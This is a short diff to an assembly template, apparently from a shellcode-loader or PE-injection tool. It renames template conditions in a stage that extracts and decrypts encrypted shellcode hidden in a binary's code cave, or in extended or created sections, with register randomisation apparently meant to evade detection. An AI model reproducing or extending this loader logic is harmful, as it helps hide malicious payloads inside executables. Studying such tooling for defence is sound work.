@@ -353,7 +353,7 @@ entry:
 
 // ================================= prepare shellcode =================================
 
-{{if .CodeCave}}
+{{if .CodeCaveMode}}
   // extract encrypted shellcode from code cave
   push {{.RegN.edi}}                           {{igi}} // save "edi"
   mov {{.RegN.ebx}}, {{hex .PayloadKey}}       {{igi}} // key of encrypted shellcode
@@ -361,9 +361,9 @@ entry:
   add {{.RegN.edi}}, {{hex .EntryOffset}}      {{igi}} // address of shellcode
   {{STUB CodeCaveMode STUB}}
   pop {{.RegN.edi}}                            {{igi}} // restore "edi"
-{{end}} // CodeCave
+{{end}}
 
-{{if or .ExtendSection .CreateSection}}
+{{if or .ExtendSectionMode .CreateSectionMode}}
   // save esi and edi
   push esi                                     {{igi}}
   push edi                                     {{igi}}
